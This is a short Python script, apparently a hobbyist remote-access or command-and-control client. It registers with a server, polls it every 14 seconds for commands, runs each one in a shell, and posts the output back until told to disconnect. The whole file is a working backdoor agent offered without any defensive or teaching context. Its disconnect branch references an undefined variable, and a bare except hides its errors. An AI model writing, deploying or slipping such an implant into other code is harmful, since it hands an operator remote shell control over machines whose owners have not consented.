import requests
import subprocess
import time

SERVER_URL = "http://127.0.0.1:5000"

def log_client():
    response = requests.get(f"{SERVER_URL}/log-client")
    if response.status_code == 200:
        return response.json()['client_id'] # idk wtf this is
    else:
        return None

def get_command(client_id):
    response = requests.get(f"{SERVER_URL}/get-command/{client_id}") # GET command from server
    # why did i name it response
    #TODO: change var name
    if response.status_code == 200: # if request was successful
        cmd = response.json().get('command')
        return cmd
    else:
        return None

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
        return result.stdout.decode('utf-8') + result.stderr.decode('utf-8') # decode standard output
    except subprocess.CalledProcessError as e: # umm uhh
        return str(e)

def main():
    try:
        client_id = log_client()
        while True:
            # cmd = get_command()
            cmd = get_command(client_id)
            if cmd == "disconnect":
                # print(f"{client_id} disconnected")
                print("disconnected")
                requests.post(SERVER_URL, json={"result": result})
                break
            result = execute_command(cmd)
            requests.post(SERVER_URL, json={"result": result})
            # print("hello from client 2")
            time.sleep(14)
    except:
        print("*crickets*")

if __name__ == "__main__":
    main()